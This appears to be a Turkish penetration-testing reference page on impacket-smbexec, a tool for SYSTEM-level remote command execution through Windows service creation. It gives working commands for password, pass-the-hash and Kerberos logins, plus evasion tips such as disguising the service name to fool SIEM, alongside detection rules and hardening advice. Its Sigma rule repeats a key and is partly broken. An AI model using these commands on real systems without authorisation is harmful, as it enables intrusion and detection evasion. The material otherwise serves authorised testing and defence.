# impacket-smbexec

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Uzak sistemin diskine çalıştırılabilir (.exe) servis ikilisi yüklemeden, Windows Service Control Manager (SCM) binPath özniteliğine doğrudan cmd.exe komut dizgisi enjekte eden ve çıktıları yerel SMB paylaşımı üzerinden okuyan Impacket yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-smbexec` (veya `smbexec.py`), Fortra/SecureAuth Impacket araç takımı içerisinde yer alan ve Windows sistemlerinde uzaktan komut yürütmeyi diske ikili (binary) dosya bırakmadan (binary-less) gerçekleştiren yenilikçi bir yanal hareket aracıdır.

Standart PsExec yaklaşımı (`impacket-psexec`), hedef makinenin `ADMIN$` paylaşımına bir `.exe` dosyası yükler. Bu işlem, modern Uç Nokta Tehdit Algılama ve Yanıt (EDR) sistemleri ve Antivirüs (AV) yazılımları tarafından anında dosya yazma (`FileCreate`) ve statik imza kontrolleriyle yakalanır. `impacket-smbexec`, bu zafiyeti bertaraf etmek amacıyla geliştirilmiştir: Hedef sisteme kesinlikle bir çalıştırılabilir dosya yüklemez.

smbexec, SMB RPC `svcctl` (Service Control Manager) arayüzünü kullanarak hedefte geçici bir Windows servisi tanımlar. Ancak bu servisin çalıştırılabilir dosya yolu (`binPath`) olarak bir `.exe` vermek yerine, doğrudan Windows Komut Yorumlayıcısını (`%COMSPEC%` / `cmd.exe`) ve çalıştırılacak komutu enjekte eder. Komutun ekran çıktısını ise yerel geri döngü (loopback) SMB paylaşımı (`\\127.0.0.1\C$\__output`) üzerinden geçici bir metin dosyasına yönlendirir. Komut icra edildikten sonra smbexec bu dosyayı SMB üzerinden okur, konsola basar ve hem dosyayı hem de oluşturulan servisi anında siler.

```
+-------------------------------------------------------------------------+
|                       impacket-smbexec Mimari Akışı                     |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [smbexec.py corp.local/admin:pass@192.168.1.15]
                               v
                     +--------------------+
                     | smbexec.py Engine  |
                     +--------------------+
                               |
               1. SMB RPC svcctl (\PIPE\svcctl)
               CreateServiceW(binPath = "%COMSPEC% /Q /c whoami > \\127.0.0.1\C$\__out 2>&1")
                               v
                +------------------------------+
                | Service Control Manager(SCM) |
                | (services.exe)               |
                +------------------------------+
                               |
               2. StartServiceW()
               (SCM servisi başlatır; servis kontrol mesajı
                dönmediği için hata verir ancak komut icra edilir)
                               |
                               +-> cmd.exe /Q /c whoami (SYSTEM)
                               |
               3. Çıktı Dosyasına Yönlendirme (Localhost SMB)
               [\\127.0.0.1\C$\__out]
                               v
                +------------------------------+
                | Hedef Disk: C:\__out         |
                | (Geçici Metin Çıktısı)       |
                +------------------------------+
                               |
               4. SMB ReadFile(\\Target\C$\__out)
               [Çıktı Linux Konsoluna Basılır]
                               |
               5. İzlerin Silinmesi:
                  - SMB DeleteFile(C:\__out)
                  - DeleteService(BGFH_Service)
```

### 1.1 smbexec Çalışma Mantığı ve Hata Yönetimi
* **Servis Başlatma Hatası (Expected Timeout):** Bir Windows servisinin SCM tarafından başarılı sayılması için `SERVICE_STATUS` bildiriminde bulunması şarttır. `cmd.exe` bir servis mimarisine sahip olmadığı için SCM servisin zaman aşımına uğradığını (`The service did not respond to the start or control request in a timely fashion`) bildirir. Bu bir hata değil, smbexec'in doğal çalışma biçimidir; komut arka planda zaten başarıyla çalışmış ve çıktısını yazmıştır.
* **Paylaşım Seçimi (`-share`):** Çıktının yazılacağı paylaşım varsayılan olarak `C$` sürücüsüdür. Ancak operasyonel gereksinimlere veya kısıtlamalara göre `ADMIN$` veya kullanıcı tanımlı farklı bir yazılabilir paylaşım seçilebilir.

### 1.2 Çıktı Yönlendirme ve SMB Geri Döngü Mekanizması (Loopback Redirection)
smbexec, komut çıktısını saldırgan makinesine aktarmak için zarif bir dosya tabanlı kanal kullanır:
* **Komut Sarmalama:** Her komut `%COMSPEC% /Q /c <komut> > \\127.0.0.1\<paylaşım>\__output 2>&1` şeklinde sarmalanır.
* **Neden Geri Döngü (127.0.0.1)?:** Hedef makine, kendi yerel SMB servisine `127.0.0.1` üzerinden bağlanarak çıktıyı `C:\__output` dosyasına yazar. Bu sayede saldırgan makinesinde dinleyici bir SMB sunucusu çalıştırmaya gerek kalmaz.
* **Eşzamanlama (Synchronization):** `smbexec.py`, SCM'den timeout hatası aldıktan sonra SMB üzerinden `__output` dosyasının oluşmasını yoklar (poll). Dosya oluştuktan sonra içeriği çeker ve derhal dosya silme (`DeleteFile`) isteği göndererek temizlik yapar.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Diske İkili Bırakmama (Binary-less)** | Hedef diskte `.exe` dosyası oluşturulmadığı için dosya tabanlı AV/EDR statik tespitlerini atlatma. |
| **SYSTEM Seviyesinde Komut Yürütme** | SCM tarafından başlatılan `cmd.exe` doğrudan `NT AUTHORITY\SYSTEM` yetkisine sahiptir. |
| **Pass-the-Hash ve Kerberos Desteği** | Parola olmadan NTLM hash veya Kerberos biletleriyle tam yetkili uzaktan yürütme. |
| **Düşük Ağ İzi** | Yalnızca standart SMB (TCP 445) portunu kullanır; RPC DCOM veya WinRM portlarına ihtiyaç duymaz. |
| **Otomatik Çıktı Yakalama ve Temizlik** | Komut çıktılarını anında yakalayıp yerel geçici dosyayı ve servisi hemen silerek dosya sistemi kalıntısını minimize etme. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-smbexec | impacket-psexec | impacket-wmiexec | Evil-WinRM |
|---|---|---|---|---|
| **Diske İkili (.exe) Yazma** | Hayır (Dosyasız) | Evet (`C:\Windows\*.exe`) | Hayır | Hayır |
| **Servis Oluşturma (SCM)** | Evet (Event ID 7045) | Evet (Event ID 7045) | Hayır | Hayır |
| **Kullanıcı Bağlamı** | `NT AUTHORITY\SYSTEM` | `NT AUTHORITY\SYSTEM` | Çağıran Kullanıcı | Çağıran Kullanıcı |
| **İnteraktif Kabuk Doğası** | Yarı-interaktif (Echo-based) | Tam İnteraktif (Named Pipe) | Yarı-interaktif | Tam İnteraktif (PowerShell) |
| **Gereken Ağ Portları** | TCP 445 | TCP 445 | TCP 135 + Dinamik RPC | TCP 5985 / 5986 |
| **EDR Yakalanma Seviyesi** | Orta | Çok Yüksek | Düşük | Düşük / Orta |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-smbexec`, Impacket paketinin standart kimlik doğrulama bayraklarını ve çıktı paylaşımı parametrelerini destekler.

### Genel Sözdizimi
```bash
impacket-smbexec [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip_veya_fqdn> [Komut] [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef / Kimlik | `[domain/]user:pass@host` | Etki alanı, kullanıcı adı, parola ve hedef adresi. | `corp.local/admin:Pass!@10.0.0.1` |
| Pass-the-Hash | `-hashes` | NTLM hash ile kimlik doğrulama (`LMHASH:NTHASH`). | `-hashes :51a26b735c02dc...` |
| Kerberos Auth | `-k` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Parolasız Mod | `-no-pass` | Parola sorma promptunu atlar. | *Argümansız bayrak* |
| KDC IP Adresi | `-dc-ip` | Kerberos bilet talepleri için DC IP'si. | `-dc-ip 10.0.0.1` |
| Çıktı Paylaşımı | `-share` | Komut çıktısının yönlendirileceği SMB paylaşımı (Varsayılan `C$`).| `-share ADMIN$` veya `-share Data` |
| Çalışma Modu | `-mode` | Çıktı alma modu (`SHARE` veya `SERVER`). | `-mode SHARE` |
| Servis Adı | `-service-name` | Hedefte oluşturulacak geçici Windows servisinin adı. | `-service-name WinDefUpdate` |
| Kabuk Tipi | `-shell-type` | Kullanılacak kabuk tipi (`cmd` veya `powershell`). | `-shell-type powershell` |
| Karakter Kodlaması| `-codec` | Çıktı karakter kodlaması (Türkçe sistemler için `cp1254`). | `-codec cp1254` |
| Komut Çalıştırma | `[komut]` | Kabuk açmadan doğrudan tek bir komut yürütüp çıkar. | `whoami /all` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanı Yöneticisi Parolası ile Yarı-İnteraktif SYSTEM Kabuğu Alma
Hedef makinede diske ikili bırakmadan `NT AUTHORITY\SYSTEM` bağlamında komut istemi başlatma.

```bash
impacket-smbexec corp.local/da_admin:P@ssword2026!@192.168.1.15
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Unsupported method: SMBv1
[*] Using SMBv2/SMBv3 connection...
[*] Opening SVCManager on 192.168.1.15.....
[*] Creating service BGFH on 192.168.1.15.....
[*] Start of service BGFH failed (expected timeout)
[*] Closing SVCManager on 192.168.1.15.....
[*] Opening SVCManager on 192.168.1.15.....
[*] Removing service BGFH on 192.168.1.15.....
[+] Opening C$ share to retrieve output...
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
FS01

C:\Windows\system32> exit
[*] Cleaning up output files on C$ share...
[+] Done
```

### Senaryo 2: Pass-the-Hash (NTLM Hash) ile Servis Hesabı Üzerinden Komut Koşturma
Parolası bilinmeyen bir yerel veya etki alanı yöneticisinin NTLM hash'i ile oturum açma.

```bash
impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.20
```

### Senaryo 3: Kerberos Bileti (.ccache) ile Pass-the-Ticket Yanal Hareketi
Önceden temin edilen Kerberos TGT bileti ile parola ve hash kullanmadan doğrudan Kerberos üzerinden kod yürütme.

```bash
export KRB5CCNAME=/tmp/da_admin.ccache
impacket-smbexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local
```

### Senaryo 4: C$ Yerine ADMIN$ Paylaşımını Kullanarak Çıktı Alma
`C$` paylaşımının güvenlik ilkeleriyle sınırlandırıldığı ancak `ADMIN$` paylaşımının erişilebilir olduğu sistemlerde çıktı dizinini değiştirme.

```bash
impacket-smbexec corp.local/jdoe:Pass123!@192.168.1.15 -share ADMIN$
```

### Senaryo 5: Özel Servis Adı ile OPSEC Kamuflajı
Rastgele 4 karakterli servis ismi yerine meşru kurumsal servisleri andıran bir ad seçerek SIEM kurallarını yanıltma.

```bash
impacket-smbexec corp.local/jdoe:Pass123!@192.168.1.15 -service-name "WindowsAudioEndpointSvc"
```

### Senaryo 6: İnteraktif Olmayan Tek Komut Yürütme ve Sonucu Alma
Kabukta kalmadan tek satırlık bir komut koşturup sonucu konsola basarak derhal oturumu kapatma.

```bash
impacket-smbexec corp.local/jdoe:Pass123!@192.168.1.15 "ipconfig /all"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Start of service ... failed (expected timeout)` | Bu bir hata değildir; `cmd.exe` bir servis kontrol mesajı dönmediği için SCM zaman aşımına uğrar. | Çıktı dosyasının okunmasını bekleyin; komut normal şekilde başarıyla yürütülmektedir. |
| `[-] Error opening SVCManager: STATUS_ACCESS_DENIED` | Kullanıcının SCM üzerinde yeni servis tanımlama yetkisi yok veya Remote UAC devrede. | Kullanıcının hedef makinede yerel yönetici (`Administrators`) grubunda olduğunu doğrulayın. |
| `[-] Cannot open output file ... STATUS_OBJECT_NAME_NOT_FOUND` | Komut `\\127.0.0.1\C$\__output` dosyasına yazamadı (Geri döngü SMB engelli veya C$ paylaşımı kapalı). | `-share ADMIN$` parametresi ile farklı bir paylaşım deneyin veya güvenlik duvarı ayarlarını kontrol edin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef makinenin Kerberos SPN kaydı Active Directory KDC'de bulunamadı. | Hedef IP yerine FQDN (`FS01.corp.local`) kullanın ve `-dc-ip` parametresi ile çalışan bir DC belirtin. |
| `STATUS_LOGON_FAILURE on SMB connection` | Kullanıcı adı veya parola hatalı ya da hesap kilitlenmiş. | Kimlik bilgilerini teyit edin; Pass-the-Hash kullanıyorsanız hash formatını (`:NTHASH`) kontrol edin. |
| `[-] SMB SessionError: STATUS_PIPE_NOT_AVAILABLE` | `\PIPE\svcctl` adlandırılmış borusu güvenlik yazılımı veya yerel ilkeler tarafından kapatılmış. | SMB servisinin çalıştığını doğrulayın; DCOM tabanlı `impacket-wmiexec` alternatifini tercih edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

impacket-smbexec, diske `.exe` dosyası bırakmadığı için dosya tabanlı AV ve EDR tarayıcılarını bypass eder. Ancak Windows Servis Yöneticisi'ne (SCM) doğrudan `%COMSPEC%` içeren şüpheli bir komut satırı göndermesi sebebiyle **davranışsal (behavioral) analiz** yapan modern EDR'lar tarafından tespit edilebilir.

```
[impacket-smbexec Yürütmesi]
          │
          ├──> SCM Üzerinde Servis Oluşturma ────> System Event ID 7045
          │                                      binPath: %COMSPEC% /Q /c ... > \\127.0.0.1\...
          │                                      Security Event ID 4697
          │
          ├──> cmd.exe Sürecinin Başlatılması ───> Sysmon Event ID 1 (services.exe -> cmd.exe)
          │
          ├──> Geri Döngü Paylaşımına Yazma ────> Event ID 5145 (AccessMask: 0x2 / WriteData)
          │                                      C:\__output Geçici Dosya Oluşturma
          │
          └──> Çıkışta Dosya ve Servis Silme ───> Event ID 7045 (Service Deleted)
                                                 Sysmon Event ID 23 (FileDelete)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **System Event ID 7045 (A Service Was Installed in the System):** `ServiceName: BGFH` ve `ImagePath: %COMSPEC% /Q /c ... > \\127.0.0.1\C$\__output 2>&1`. Bu komut satırı deseni SIEM korelasyonlarında smbexec'in en belirgin imzasıdır.
* **Security Event ID 4697 (A service was installed in the system):** Güvenlik günlüğüne düşen yetkili servis kurulum kaydı.
* **Sysmon Event ID 1 (Process Creation):** `ParentImage: services.exe` -> `Image: cmd.exe` türetilmesi ve komut satırında `\\127.0.0.1\` veya `__output` geçmesi.
* **Security Event ID 5145 (Detailed File Share Access):** `C$` veya `ADMIN$` paylaşımında rastgele veya `__output` isimli geçici dosyanın oluşturulması ve ardından okunup silinmesi.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Execution** | [T1569.002](https://attack.mitre.org/techniques/T1569/002/) | Service Execution | SCM `binPath` manipülasyonu ile komut koşturma. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `cmd.exe` üzerinden komut yürütme. |
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | SMB paylaşımları üzerinden girdi/çıktı yönetimi. |
| **Privilege Escalation** | [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Servis mekanizması ile doğrudan `SYSTEM` yetkisi elde etme. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **Event ID 7045 Komut Satırı İmzası** | Servis yolunda açıkça `%COMSPEC%` ve `127.0.0.1` geçmesi. | Servis oluşturmayan DCOM/WMI tabanlı `impacket-wmiexec` veya PowerShell tabanlı `Evil-WinRM` kullanın. |
| **services.exe -> cmd.exe Türemesi** | SCM'in alt süreç olarak `cmd.exe` başlatması EDR davranış kuralıdır. | Mümkünse komut satırını doğrudan çalıştırmak yerine var olan meşru bir Windows görevini tetikleyin. |
| **Geçici Çıktı Dosyası İzi** | `C:\__output` dosyasının FIM (File Integrity Monitoring) tarafından görülmesi. | `-share` parametresi ile daha az izlenen bir paylaşım seçin veya kör (blind) yürütme yapın. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (Service Creation with Command Redirection Pattern - smbexec)
```yaml
title: Potential Impacket smbexec Execution Pattern
id: d1c2b3a4-7890-5678-ba98-fedcba098765
status: production
description: Service Control Manager üzerinde cmd.exe ve loopback SMB yönlendirmesi içeren servis oluşturulduğu tespit edildi.
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ImagePath|contains:
      - 'cmd.exe'
      - '%COMSPEC%'
    ImagePath|contains:
      - '127.0.0.1\'
      - 'echo'
      - '> '
  condition: selection
falsepositives:
  - Çok nadir görülen eski yönetimsel bakım betikleri
level: critical
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 7045
| extend ServicePath = tostring(EventData.ImagePath)
| where ServicePath has "127.0.0.1" and (ServicePath has "cmd.exe" or ServicePath has "%COMSPEC%")
| project TimeGenerated, Computer, EventData.ServiceName, ServicePath, SubjectUserName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_SMBExec_Script_Artifact {
    meta:
        description = "impacket-smbexec Python script statik tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "smbexec" ascii wide nocase
        $s2 = "%COMSPEC% /Q /c" ascii
        $s3 = "127.0.0.1" ascii
        $s4 = "Opening SVCManager" ascii
        $s5 = "Start of service" ascii
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Geri Döngü SMB Kısıtlamaları (Loopback SMB Blocking):** İstemci ve sunucuların kendi yerel IP'leri (`127.0.0.1`) üzerinden SMB paylaşımlarına dosya yönlendirmesi güvenlik ilkeleriyle kısıtlanmalıdır.
* **Yönetimsel Paylaşımların Kısıtlanması:** `LocalAccountTokenFilterPolicy = 0` tutularak yerel yöneticilerin ağ üzerinden `C$` ve `ADMIN$` erişimleri engellenmelidir.
* **Servis Kurulum Denetimi ve Alarmı (Event ID 7045):** Olay günlüklerinde servis `ImagePath` özniteliğinde `cmd.exe`, `powershell.exe`, `127.0.0.1` veya `> ` içeren tüm kurulumlar SIEM'de kritik seviyede anlık alarm üretmelidir.
* **Uç Nokta EDR Davranışsal Kuralları:** `services.exe` sürecinin doğrudan `cmd.exe` veya script motorlarını başlatması engelleme (block) kuralına bağlanmalıdır.
* **SMB v1'in Kaldırılması ve SMB Şifreleme:** Eski ve güvensiz SMB sürümleri kaldırılmalı; SMB trafiği TLS/SMB Encryption ile şifrelenerek ağ izleme ve sömürü girişimleri zorlaştırılmalıdır.
* **Script Block Logging ve Denetim:** `-shell-type powershell` çağrılarına karşı PowerShell Script Block Logging (Event ID 4104) etkinleştirilmeli ve merkezi SIEM'e aktarılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Parola ile SYSTEM Yetkisinde Yarı-İnteraktif Kabuk
impacket-smbexec corp.local/da_admin:P@ssword2026!@192.168.1.15

# 2. Pass-the-Hash (NTLM Hash) ile Dosyasız Kabuk Açma
impacket-smbexec -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.15

# 3. Kerberos Bileti (.ccache) ile Parolasız Yanal Hareket
export KRB5CCNAME=/tmp/da_admin.ccache && impacket-smbexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local

# 4. Çıktı Paylaşımı Olarak ADMIN$ Belirleme
impacket-smbexec corp.local/admin:Pass!@192.168.1.15 -share ADMIN$

# 5. Özel Servis Adı Belirterek İzi Azaltma
impacket-smbexec corp.local/admin:Pass!@192.168.1.15 -service-name "WindowsCrashReporter"

# 6. PowerShell Kabuk Modu Seçerek Komut Çalıştırma
impacket-smbexec corp.local/admin:Pass!@192.168.1.15 -shell-type powershell

# 7. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
impacket-smbexec corp.local/admin:Pass!@192.168.1.15 "net localgroup administrators"

# 8. Türkçe Karakter Desteği için Codec Tanımlama
impacket-smbexec corp.local/admin:Pass!@192.168.1.15 -codec cp1254

# 9. Hedef IP Zorlayarak Kerberos ile Bağlanma
impacket-smbexec -k -no-pass -target-ip 192.168.1.15 CORP.LOCAL/admin@FS01.corp.local

# 10. Yerel SAM Hesabı ile Doğrulama Yapma
impacket-smbexec ./Administrator:LocalAdmin2026!@192.168.1.25
```

### Komut Detay Analizleri

#### 1. Standart Parola ile SYSTEM Yetkisinde Yarı-İnteraktif Kabuk
* **Ne Yapar?:** Hedef makinede diske dosya yazmadan SCM `binPath` enjeksiyonu yapar ve `NT AUTHORITY\SYSTEM` yetkisinde çalışan bir komut kabuğu sunar.
* **Ne Zaman Kullanılır?:** PsExec'in dosya yazma engellerine takıldığı ancak SCM erişiminin bulunduğu durumlarda.
* **Parametreler:**
  * `corp.local/da_admin:P@ssword2026!`: Etki alanı yöneticisi kimlik bilgileri.
  * `@192.168.1.15`: Hedef sunucu IP adresi.

#### 2. Pass-the-Hash (NTLM Hash) ile Dosyasız Kabuk Açma
* **Ne Yapar?:** Açık metin parola olmadan, ele geçirilen NTLM hash ile kimlik doğrulayarak dosyasız kod koşturur.
* **Ne Zaman Kullanılır?:** Parola kırılamadığında ve AV/EDR disk taramalarından kaçınmak istendiğinde.
* **Parametreler:**
  * `-hashes :<NTHASH>`: NTLM özet bilgisi.

#### 3. Kerberos Bileti (.ccache) ile Parolasız Yanal Hareket
* **Ne Yapar?:** Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM trafiği üretmeden Kerberos üzerinden SCM servisi tetikler.
* **Ne Zaman Kullanılır?:** NTLM izleme alarmlarını tetiklememek ve Kerberos tabanlı yanal hareket gerçekleştirmek için.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulaması.
  * `-no-pass`: Parola sorma promptunu atlar.

#### 4. Çıktı Paylaşımı Olarak ADMIN$ Belirleme
* **Ne Yapar?:** Çıktı dosyasını `C$` sürücüsü yerine `ADMIN$` (`C:\Windows`) dizinine yönlendirir.
* **Ne Zaman Kullanılır?:** `C$` paylaşımının devre dışı bırakıldığı veya filtrelendiği ortamlarda.
* **Parametreler:**
  * `-share ADMIN$`: Çıktının yazılacağı hedef paylaşım adı.

#### 5. Özel Servis Adı Belirterek İzi Azaltma
* **Ne Yapar?:** Rastgele 4 karakterli servis ismi yerine meşru Windows servislerini taklit eden özel bir ad tanımlar.
* **Ne Zaman Kullanılır?:** Basit imza bazlı ve rastgele ad denetimi yapan SIEM kurallarını atlatmak için.
* **Parametreler:**
  * `-service-name "WindowsCrashReporter"`: Özel servis başlığı.

#### 6. PowerShell Kabuk Modu Seçerek Komut Çalıştırma
* **Ne Yapar?:** Varsayılan `cmd.exe` yerine doğrudan `powershell.exe` çağrısıyla komutları işletir.
* **Ne Zaman Kullanılır?:** PowerShell cmdlet'leri veya betikleri çalıştırılmak istendiğinde.
* **Parametreler:**
  * `-shell-type powershell`: Yorumlayıcı olarak PowerShell seçimi.

#### 7. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
* **Ne Yapar?:** İnteraktif oturumda kalmadan tek bir yönetim komutunu koşturur, çıktıyı ekrana basar ve tüm izleri silip çıkar.
* **Ne Zaman Kullanılır?:** Hızlı bilgi toplama ve otomasyon betikleri için.
* **Parametreler:**
  * Komut dizesi parametre olarak sona eklenir.

#### 8. Türkçe Karakter Desteği için Codec Tanımlama
* **Ne Yapar?:** Türkçe Windows sistemlerinden dönen metinlerdeki karakter bozulmalarını engeller.
* **Ne Zaman Kullanılır?:** Çıktıların okunabilirliğini korumak için.
* **Parametreler:**
  * `-codec cp1254`: Windows-1254 Türkçe kodlaması.

#### 9. Hedef IP Zorlayarak Kerberos ile Bağlanma
* **Ne Yapar?:** FQDN üzerinden bilet talep ederken ağ soketini belirtilen IP'ye bağlar.
* **Ne Zaman Kullanılır?:** DNS yapılandırmasının eksik olduğu test ortamlarında.
* **Parametreler:**
  * `-target-ip 192.168.1.15`: Hedef makine IP adresi.

#### 10. Yerel SAM Hesabı ile Doğrulama Yapma
* **Ne Yapar?:** Etki alanı yerine hedef sistemin yerel SAM veritabanındaki hesapla kimlik doğrular.
* **Ne Zaman Kullanılır?:** LAPS parolası veya yerel yönetici parolası ele geçirildiğinde.
* **Parametreler:**
  * `./Administrator`: Yerel kullanıcı bağlamı.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [MITRE ATT&CK: Service Execution (T1569.002)](https://attack.mitre.org/techniques/T1569/002/)
* [MITRE ATT&CK: SMB/Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002/)
* [Microsoft Open Specifications: [MS-SCMR] Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/)
* [SANS Reading Room: Detecting Lateral Movement with Sysmon and Windows Logs](https://www.sans.org/white-papers/)
* [SpecterOps: Understanding Service Creation Lateral Movement](https://posts.specterops.io/)

---

> **Önceki:** [← impacket-psexec](./impacket-psexec.md) · **Sonraki:** [impacket-wmiexec →](./impacket-wmiexec.md)
